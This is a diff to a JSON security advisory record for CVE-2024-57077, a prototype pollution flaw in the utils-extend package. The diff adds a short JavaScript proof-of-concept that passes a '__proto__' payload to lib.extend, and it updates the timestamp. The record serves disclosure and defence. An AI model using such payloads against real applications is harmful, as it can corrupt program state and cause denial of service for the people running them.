@@ -30,12 +30,12 @@
         "Value": "CVE-2024-57077"
       }
     ],
-    "Description": "The latest version of utils-extend (1.0.8) is vulnerable to Prototype Pollution through the entry function(s) lib.extend. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.",
+    "Description": "The latest version of utils-extend (1.0.8) is vulnerable to Prototype Pollution through the entry function(s) lib.extend. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.\n\n## PoC\n```js\nasync function exploit() {\n   const utilsextend = require(\\\"utils-extend\\\");\n   const payload = JSON.parse('{\\\"__proto__\\\":{\\\"exploited\\\":true}}');\n   const result = await utilsextend.extend({}, payload);\n}\n\nawait exploit();\n```",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2025-02-06T06:31:26Z",
     "Severity": "CRITICAL",
     "Summary": "utils-extend Prototype Pollution",
-    "UpdatedAt": "2025-02-06T23:31:54Z",
+    "UpdatedAt": "2025-09-03T15:22:41Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 9.1,
